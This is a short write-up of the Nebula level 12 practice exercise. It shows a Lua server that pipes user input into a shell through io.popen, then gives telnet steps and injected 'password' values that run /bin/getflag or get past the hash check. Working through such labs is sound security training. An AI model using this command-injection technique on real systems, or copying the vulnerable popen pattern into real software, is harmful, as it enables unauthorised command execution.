.. _nebula12:

.. role:: bash(code)
	  :language: bash

.. role:: lua(code)
	  :language: lua
	       
Nebula 12
=========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level12/

**Source Code**

.. code-block:: lua
		
		local socket = require("socket")
		local server = assert(socket.bind("127.0.0.1", 50001))

		function hash(password)
		    prog = io.popen("echo "..password.." | sha1sum", "r")
		    data = prog:read("*all")
		    prog:close()

		    data = string.sub(data, 1, 40)

		    return data
		end


		while 1 do
		    local client = server:accept()
		    client:send("Password: ")
		    client:settimeout(60)
		    local line, err = client:receive()
		    if not err then
		        print("trying " .. line) -- log from where ;\
			local h = hash(line)

			if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
			    client:send("Better luck next time\n");
			else
			    client:send("Congrats, your token is 413**CARRIER LOST**\n")
			end

		end

		client:close()
		end

Solution
--------

Execute :bash:`telnet` on localhost on port 50001

:bash:`$ telnet 127.0.0.1 50001`

When password is asked

:bash:`Password: 1;/bin/getflag > /tmp/level12;echo 1`

It will say better luck next time and it will close the connection

Then simply use cat the output file

:bash:`cat /tmp/level12`

In case you want to pass the hash it will be this way

:bash:`$ telnet 127.0.0.1 50001`

:bash:`Password: 4754a4f4bd5787accd33de887b9250a0691dd198;echo 1`

